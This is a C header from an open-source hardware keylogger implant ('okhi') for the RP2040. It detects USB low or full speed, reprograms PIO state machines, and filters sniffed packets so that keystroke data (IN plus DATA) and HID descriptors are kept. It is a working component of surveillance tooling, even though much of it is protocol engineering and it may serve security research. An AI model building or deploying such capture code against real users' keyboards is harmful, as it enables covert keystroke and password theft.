/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

#ifndef USB_SPEED_H
#define USB_SPEED_H

// Low speed and full speed with one PIO program. USB 2.0 7.1.7.1 swaps J and K between the two (J
// is D- high at low speed, D+ high at full speed), so three things change and nothing else: the
// line the sampler waits on for the idle J and for the start of a packet (instructions 1 and 2 of
// tar_lowsp_pio0, rewritten while the state machines are stopped), the pin that tells J from K
// (JMP PIN: D+ at low speed, D- at full speed), and the clock: 15 MHz for 1.5 Mbit/s and 120 MHz
// for 12 Mbit/s, 10 PIO cycles a bit at either speed, both integer dividers of the 120 MHz system
// clock. PIO1 runs at PIO0's clock, so its 4-sample SE0 debounce (100 ns at full speed) fits in
// the 167 ns of a full speed EOP.
//
// Core 0 picks the speed from the idle level of the lines (USB 2.0 7.1.5: a full speed device idles
// with D+ high, a low speed one with D- high), sampled between packets every 32 us. A window of 64
// samples (2 ms) that is nearly all the idle level of the other speed switches the capture there
// and then: after a plug-in the PC waits 100 ms before it resets the port and reads the
// descriptors, so those are captured at the right speed. Traffic at the speed being captured keeps
// the line at that speed's idle level nearly all the time, so it never trips the switch, and a
// detach or a bus reset (both lines low) keep the current speed. usb_bus_watch() reads the same
// pads on core 1, slower, for the verdict the page shows.

#define USB_SPEED_WAIT_IDLE 1 // "wait 1 pin <J line>" in tar_lowsp_pio0
#define USB_SPEED_WAIT_SOP 2  // "wait 0 pin <J line>"
#define USB_SPEED_ENTRY 31    // the entry WAIT on START

static uint usb_speed_sm0;
static uint usb_speed_sm1;
static uint usb_speed_pio1_start;
static bool usb_speed_patchable;

static volatile bool capture_fs;               // the speed core 0 captures at, true = full speed
static volatile uint32_t capture_speed_epoch;  // bumped every time a speed is applied

// The program must be the one this module knows how to patch, loaded where main() expects it.
static void usb_speed_init(uint sm0, uint pio0_offset, uint sm1, uint pio1_offset)
{
    usb_speed_sm0 = sm0;
    usb_speed_sm1 = sm1;
    usb_speed_pio1_start = pio1_offset;
    usb_speed_patchable = pio0_offset == 0 && tar_lowsp_pio0_program.length == 32 &&
                          tar_lowsp_pio0_program_instructions[USB_SPEED_WAIT_IDLE] == pio_encode_wait_pin(true, 1) &&
                          tar_lowsp_pio0_program_instructions[USB_SPEED_WAIT_SOP] == pio_encode_wait_pin(false, 1);

    if (!usb_speed_patchable)
    {
        puts("usb capture: unexpected PIO program, low speed only");
    }
}

#define USB_SPEED_PAD_US 32
#define USB_SPEED_PAD_WINDOW 64
#define USB_SPEED_PAD_MAJORITY 60

// One pad sample every USB_SPEED_PAD_US, called while PIO0's FIFO is empty. -2 until a window is
// complete, then the speed the lines idled at if the window was nearly all one: 1 full, 0 low, -1
// neither.
static int usb_speed_pads(void)
{
    static uint32_t sampled_at;
    static uint8_t samples, full, low;

    uint32_t now = time_us_32();

    if (now - sampled_at < USB_SPEED_PAD_US)
    {
        return -2;
    }

    sampled_at = now;

    uint32_t pads = gpio_get_all();
    bool dp = (pads >> DP_INDEX) & 1u;
    bool dm = (pads >> DM_INDEX) & 1u;

    full += dp && !dm;
    low += dm && !dp;

    if (++samples < USB_SPEED_PAD_WINDOW)
    {
        return -2;
    }

    int idle = full >= USB_SPEED_PAD_MAJORITY ? 1 : low >= USB_SPEED_PAD_MAJORITY ? 0 : -1;

    samples = full = low = 0;
    return idle;
}

// Core 0, between packets: true when the lines idle at the speed not being captured.
static bool usb_speed_switch_due(void)
{
    int idle = usb_speed_pads();

    return idle >= 0 && (idle == 1) != capture_fs && (usb_speed_patchable || idle == 0);
}

// The speed to start at, from one window (2 ms): low speed unless the lines idle at full speed, so
// with nothing attached yet it starts at low speed and switches when a device pulls D+ up.
static bool usb_speed_at_boot(void)
{
    int idle;

    while ((idle = usb_speed_pads()) == -2)
    {
        tight_loop_contents();
    }

    return idle == 1 && usb_speed_patchable;
}

static void usb_speed_stop(void)
{
    pio_sm_set_enabled(pio1, usb_speed_sm1, false);
    pio_sm_set_enabled(pio0, usb_speed_sm0, false);
}

// Both state machines stopped.
static void usb_speed_set(bool fs)
{
    uint j_line = fs ? 0 : 1; // IN pin 0 is D+, 1 is D-
    float div = (float)clock_get_hz(clk_sys) / (fs ? 120000000.0f : 15000000.0f);

    pio0->instr_mem[USB_SPEED_WAIT_IDLE] = pio_encode_wait_pin(true, j_line);
    pio0->instr_mem[USB_SPEED_WAIT_SOP] = pio_encode_wait_pin(false, j_line);
    pio_sm_set_jmp_pin(pio0, usb_speed_sm0, fs ? DM_INDEX : DP_INDEX);
    pio_sm_set_clkdiv(pio0, usb_speed_sm0, div);
    pio_sm_set_clkdiv(pio1, usb_speed_sm1, div);
    capture_fs = fs;
    capture_speed_epoch++;
}

// Both state machines stopped. PIO0 parks on its entry WAIT with START held low, then PIO1 starts
// from its first instruction and raises START on the first clean SE0, so capture always begins
// between two packets. The same sequence at boot and after every speed change.
static void usb_speed_start(void)
{
    pio_sm_clear_fifos(pio0, usb_speed_sm0);
    pio_sm_restart(pio0, usb_speed_sm0);
    pio_sm_clkdiv_restart(pio0, usb_speed_sm0);
    pio_sm_restart(pio1, usb_speed_sm1);
    pio_sm_clkdiv_restart(pio1, usb_speed_sm1);
    pio_sm_exec(pio1, usb_speed_sm1, pio_encode_set(pio_pins, 0));
    pio_sm_exec(pio1, usb_speed_sm1, pio_encode_jmp(usb_speed_pio1_start));
    pio_sm_exec(pio0, usb_speed_sm0, pio_encode_jmp(USB_SPEED_ENTRY));
    pio_sm_set_enabled(pio0, usb_speed_sm0, true);
    pio_sm_exec(pio0, usb_speed_sm0, pio_encode_jmp(USB_SPEED_ENTRY));
    pio_sm_clear_fifos(pio0, usb_speed_sm0);
    pio_sm_set_enabled(pio1, usb_speed_sm1, true);
}

// The first 16 line samples of a full speed packet are its SYNC and PID: D+ is low in K and high in
// J, a 0 bit toggles the line and a 1 keeps it, and no stuffed bit fits in them, so they are the
// same for every packet with that PID. A packet of fewer than 31 samples comes in one right-aligned
// word. Only a packet captured exactly so matches; anything else is OTHER and stored as before.
#define USB_FS_LINE_OUT 0x5450   // KJKJKJKK, then PID 0xe1
#define USB_FS_LINE_IN 0x544e    // 0x69
#define USB_FS_LINE_SOF 0x546c   // 0xa5
#define USB_FS_LINE_SETUP 0x5472 // 0x2d
#define USB_FS_LINE_DATA0 0x5428 // 0xc3
#define USB_FS_LINE_DATA1 0x5436 // 0x4b
#define USB_FS_LINE_ACK 0x54d8   // 0xd2
#define USB_FS_LINE_NAK 0x54c6   // 0x5a
#define USB_FS_LINE_PRE 0x5482   // 0x3c, with the low speed packet after it in the same record

enum
{
    USB_FS_OTHER,
    USB_FS_IN,
    USB_FS_OUT,   // data from the host follows, never a key
    USB_FS_SETUP, // a control request follows, which usb_hid.h reads
    USB_FS_SOF,
    USB_FS_DATA,
    USB_FS_NAK,
    USB_FS_ACK,
    USB_FS_PRE, // the host talking to a low speed device on the same hub, never to this one
};

static inline uint32_t usb_fs_first16(uint32_t w0, uint32_t samples)
{
    return (samples >= 31 ? w0 >> 15 : w0 >> (samples - 16)) & 0xffff;
}

// A handshake is SYNC, PID and the SE0 sample: 17 samples, 18 with its last bit stretched by hubs
// (USB 2.0 7.1.9.1). A token adds 11 bits of address and endpoint (or frame number), CRC5 and the
// stuffed bits: up to 3 after an OUT, whose PID ends in three 1s, so 33 to 36. A DATA packet is 33
// or more, and so is a PRE with the low speed packet glued to it (no EOP between them).
static inline int usb_fs_kind(uint32_t w0, uint32_t samples)
{
    if (samples == 17 || samples == 18)
    {
        uint32_t line = usb_fs_first16(w0, samples);
        return line == USB_FS_LINE_NAK ? USB_FS_NAK : line == USB_FS_LINE_ACK ? USB_FS_ACK : USB_FS_OTHER;
    }

    if (samples < 33)
    {
        return USB_FS_OTHER;
    }

    uint32_t line = (w0 >> 15) & 0xffff;

    if (line == USB_FS_LINE_PRE)
    {
        return USB_FS_PRE;
    }

    if (line == USB_FS_LINE_DATA0 || line == USB_FS_LINE_DATA1)
    {
        return USB_FS_DATA;
    }

    if (samples > 36)
    {
        return USB_FS_OTHER;
    }

    if (line == USB_FS_LINE_IN)
    {
        return USB_FS_IN;
    }

    if (line == USB_FS_LINE_OUT)
    {
        return USB_FS_OUT;
    }

    if (line == USB_FS_LINE_SETUP)
    {
        return USB_FS_SETUP;
    }

    return line == USB_FS_LINE_SOF ? USB_FS_SOF : USB_FS_OTHER;
}

// What core 0 stores at full speed. A hub with one transaction translator for all its ports
// repeats everything the host sends to every full speed port, so this port also carries the
// tokens, the OUT and SETUP data and the handshakes the host sends to other devices, while their
// replies leave by their own ports. Keys travel as an IN answered by DATA, and the descriptors that
// say how to read them come in the same shape on EP0 after a SETUP and its 8-byte request. Core 0
// keeps those two pairs, the SOFs (the frame count), a DATA with no token before it in the buffer
// and anything it cannot classify, and drops the idle polls (IN + NAK), an IN that only the host's
// ACK follows (another device's data), the tokens nothing answers here, the data the host sends
// after OUT and the lone handshakes. On the bench on 2026-11-04 okhi-kbd's own USB serial adapter,
// on the same hub, was polled 36000 times a second: stored, that filled a buffer in 0.1 s, against
// 1.5 s that core 1 may hold one while the ESP does not answer (USB_PATIENCE_US).
typedef struct
{
    int tok;      // header of the last packet stored when it is an IN, OUT or SETUP token, else -1
    int tok_kind; // which of the three
} usb_fs_filter_t;

// Core 0, for every full speed packet that closed with room in the buffer. Returns true when it is
// not stored, and *packet and *index are then where the next one goes. A token followed by another
// token is dropped, and the second one moved down over it.
static bool usb_fs_skip(usb_fs_filter_t *f, volatile dbuff_t *d, int *packet, int *index, uint32_t samples)
{
    volatile uint32_t *buf = d->g_buffer;
    int kind = *index > *packet + 2 ? usb_fs_kind(buf[*packet + 2], samples) : USB_FS_OTHER;

    // A PRE and the low speed packet after it, which a hub repeats to its full speed ports too
    // (USB 2.0 11.8.4): sampled at full speed it is noise, so it is not stored. A token stored
    // before it keeps waiting, and the next packet settles it.
    if (kind == USB_FS_PRE)
    {
        d->g_buffer_info.other++;
        *index = *packet + 2;
        return true;
    }

    if (f->tok >= 0)
    {
        int tok = f->tok;

        f->tok = -1;

        if (kind == USB_FS_DATA && (f->tok_kind == USB_FS_IN || f->tok_kind == USB_FS_SETUP))
        {
            return false;
        }

        // IN + NAK: an idle poll of this device. IN + ACK: another device's data, which the host ACKed.
        // OUT + DATA: data the host sends, never a key.
        if (kind == USB_FS_DATA || kind == USB_FS_NAK || kind == USB_FS_ACK)
        {
            if (f->tok_kind == USB_FS_IN && kind == USB_FS_NAK)
            {
                d->g_buffer_info.polls++;
            }
            else
            {
                d->g_buffer_info.other += 2;
            }

            d->g_buffer_info.count--;
            *packet = tok;
            *index = tok + 2;
            return true;
        }

        // Nothing answered the token on this port: it was for another device.
        if (kind == USB_FS_IN || kind == USB_FS_OUT || kind == USB_FS_SETUP || kind == USB_FS_SOF)
        {
            int words = *index - (*packet + 2);

            for (int i = 0; i < words; i++)
            {
                buf[tok + 2 + i] = buf[*packet + 2 + i];
            }

            d->g_buffer_info.count--;
            d->g_buffer_info.other++;
            *packet = tok;
            *index = tok + 2 + words;
        }
    }
    else if (kind == USB_FS_NAK || kind == USB_FS_ACK)
    {
        // A handshake on its own: the host's ACK of a report, or this device answering an OUT.
        d->g_buffer_info.other++;
        *index = *packet + 2;
        return true;
    }

    if (kind == USB_FS_IN || kind == USB_FS_OUT || kind == USB_FS_SETUP)
    {
        f->tok = *packet;
        f->tok_kind = kind;
    }

    return false;
}

#endif // USB_SPEED_H
